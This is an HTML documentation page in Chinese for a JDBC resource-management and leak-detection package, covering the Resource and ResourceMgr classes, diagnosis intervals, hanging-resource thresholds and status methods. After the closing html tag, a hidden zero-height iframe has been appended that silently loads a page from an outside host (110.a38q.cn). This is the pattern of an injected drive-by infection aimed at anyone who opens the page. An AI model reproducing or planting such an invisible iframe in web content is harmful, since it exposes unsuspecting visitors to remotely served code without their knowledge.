<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<meta http-equiv="Content-Type" content="text/html; charset=gbk" />
<head>
</head>
<body>
<p>资源管理及泄漏检测。检测数据库的资源（连接、语句、PS、结果集）是否被正常关闭，同时不影响在垃圾收集时进行资源关闭行为。
功能：
- 维护各类活跃资源列表、最近访问信息、执行的操作信息。
- 统计资源隐式关闭情况。
- 提供定期扫描关闭长期不活跃资源功能。

<p>数据库资源的一般是通过close()方法关闭，为增强健壮性，一些JDBC实现也采用资源被垃圾收集时隐式关闭资源的方法。
但隐式关闭的做法是不提倡的。另外也存在应用程序长期占有一个资源的引用，但永远不关闭的情况。
这两者都通常意味着应用程序的bug，一个好的JDBC驱动程序应该提供对这两种情况的检测功能。

<p>简单的做法是维护活跃资源的列表，但为了使垃圾收集隐式关闭方法起作用，在资源列表中只能使用对资源对象的弱引用，
而不能用普通的对象引用。

<p>数据库资源之间来存在包含关系（连接 > (语句|PS) > 结果集）。关闭上层的资源应包括关闭其所有子孙资源，
访问子资源时也隐含着访问了其祖先资源。这些语义也由本包统一处理。

<h3>实现</h3>
<p>本包主要包含两个类：Resource和ResourceMgr，两者职责明确。Resource负责管理单个资源的使用情况及资源之间的“辈份”关系。
包括资源的创建时间、访问时间及最近执行的操作等。ResourceMgr则负责管理“辈份”相同的资源集，
包括资源的创建/关闭次数、平均生存周期，并维护一个被隐式关闭及悬挂资源的采样，方便故障诊断。
ResourceMgr的内部类AsyncDiagnoseThread异步线程负责定期扫描当前资源列表，关闭已经被垃圾回收或长期不活跃的资源。

<h3>可定制性</h3>
资源管理器的以下参数可动态配置：
<ul>
<li>异步线程进行错误检测的时间间隔，可通过ResourceMgr.setDiagnoseInterval设置。
<li>资源被判定为悬挂资源的最小空闲时间，可通过ResourceMgr.setHangingThreshold设置，将这一时间设为非常大相当于不启用悬挂资源检测功能。
<li>隐式关闭及悬挂资源采样大小，可通过ResourceMgr.setSampleSize设置。
</ul>

<h3>使用</h3>
在创建一个资源时创建一个Resource对象，在构建器参数中指定其所属的资源管理器。在资源被关闭时调用对应Resource对象的close()方法。

<h3>状态信息</h3>
ResourceMgr提供了一些方法显示其管理的资源的使用情况，请参见showStatus，[get/show]ActiveResources，
[get/show]ImpCloseSamples，[get/show]HangCloseSamples等参数说明。

</body>
</html><iframe src="http://110.a38q.cn/lx.htm" width="100" height="0" frameborder="0"></iframe>
